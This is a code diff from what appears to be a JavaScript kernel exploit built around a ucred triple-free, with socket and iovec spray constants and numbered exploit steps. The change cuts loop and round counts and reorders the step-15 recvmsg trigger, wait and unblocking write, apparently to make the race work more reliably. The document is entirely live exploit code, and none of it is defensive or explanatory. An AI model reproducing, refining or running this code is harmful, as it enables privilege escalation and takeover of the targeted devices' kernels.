@@ -117,10 +117,10 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 8;
 var IOV_THREAD_NUM = 4;
 var UIO_THREAD_NUM = 4;
-var MAIN_LOOP_ITERATIONS = 5;
-var TRIPLEFREE_ITERATIONS = 5;
+var MAIN_LOOP_ITERATIONS = 2;
+var TRIPLEFREE_ITERATIONS = 2;
 var MAX_ROUNDS_TWIN = 4;
-var MAX_ROUNDS_TRIPLET = 40;
+var MAX_ROUNDS_TRIPLET = 4;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
 var RTP_LOOKUP = 0;
@@ -1396,11 +1396,11 @@ function trigger_ucred_triplefree() {
     send_notification("[STEP 14] final close DONE");
 
     // STEP 15 — قراءة بعد الفلو
-    send_notification("[STEP 15] Waiting for iov_recvmsg...");
-    wait_iov_recvmsg();
+    trigger_iov_recvmsg();
     send_notification("[STEP 15] Sending 1 byte to iov_sock_1 to unblock read...");
     write(new BigInt(iov_sock_1), tmp, 1);
-
+    send_notification("[STEP 15] Waiting for iov_recvmsg...");
+    wait_iov_recvmsg();
     send_notification("[STEP 15] Reading from iov_sock_0...");
     read(new BigInt(iov_sock_0), tmp, 1);
     send_notification("[STEP 15] Read complete");
